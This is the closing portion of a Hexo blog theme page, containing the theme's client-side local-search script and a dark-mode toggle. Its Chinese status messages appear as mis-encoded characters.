          $input.addEventListener('input', function () {
            // 0x03. parse query to keywords list
            var str = '<ul class=\"search-result-list\">';
            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
            $resultContent.innerHTML = "";
            if (this.value.trim().length <= 0) {
              return;
            }
            // 0x04. perform local searching
            datas.forEach(function (data) {
              var isMatch = true;
              var content_index = [];
              if (!data.title || data.title.trim() === '') {
                data.title = "Untitled";
              }
              var orig_data_title = data.title.trim();
              var data_title = orig_data_title.toLowerCase();
              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
              var data_content = orig_data_content.toLowerCase();
              var data_url = data.url;
              var index_title = -1;
              var index_content = -1;
              var first_occur = -1;
              // only match artiles with not empty contents
              if (data_content !== '') {
                keywords.forEach(function (keyword, i) {
                  index_title = data_title.indexOf(keyword);
                  index_content = data_content.indexOf(keyword);

                  if (index_title < 0 && index_content < 0) {
                    isMatch = false;
                  } else {
                    if (index_content < 0) {
                      index_content = 0;
                    }
                    if (i == 0) {
                      first_occur = index_content;
                    }
                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
                  }
                });
              } else {
                isMatch = false;
              }
              // 0x05. show search results
              if (isMatch) {
                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
                var content = orig_data_content;
                if (first_occur >= 0) {
                  // cut out 100 characters
                  var start = first_occur - 20;
                  var end = first_occur + 80;

                  if (start < 0) {
                    start = 0;
                  }

                  if (start == 0) {
                    end = 100;
                  }

                  if (end > content.length) {
                    end = content.length;
                  }

                  var match_content = content.substr(start, end);

                  // highlight all keywords
                  keywords.forEach(function (keyword) {
                    var regS = new RegExp(keyword, "gi");
                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
                  });

                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
                }
                str += "</li>";
              }
            });
            str += "</ul>";
            if (str.indexOf('<li>') === -1) {
              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>æ²¡æœ‰æ‰¾åˆ°å†…å®¹ï¼Œè¯·å°è¯•æ›´æ¢æ£€ç´¢è¯ã€‚<span></ul>";
            }
            $resultContent.innerHTML = str;
          });
        },
        error: function(xhr, status, error) {
          $resultContent.innerHTML = ""
          if (xhr.status === 404) {
            $resultContent.innerHTML = "<ul><span class='local-search-empty'>æœªæ‰¾åˆ°search.xmlæ–‡ä»¶ï¼Œå…·ä½“è¯·å‚è€ƒï¼š<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
          } else {
            $resultContent.innerHTML = "<ul><span class='local-search-empty'>è¯·æ±‚å¤±è´¥ï¼Œå°è¯•é‡æ–°åˆ·æ–°é¡µé¢æˆ–ç¨åé‡è¯•ã€‚<span></ul>";
          }
        }
      });
      $(document).on('click', '#search-close-icon', function() {
        $('#search-input').val('');
        $('#search-result').html('');
      });
    }

    var getSearchFile = function() {
        var path = "/search.xml";
        searchFunc(path, 'search-input', 'search-result');
    }
  </script>




        
  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
    <a href="javascript: void(0)">
      <i id="theme-icon" class="iconfont icon-moon"></i>
    </a>
  </div>

  
<script src="../../js/colorscheme.js"></script>





        

      </div>
    </div>
  </body>
</html>
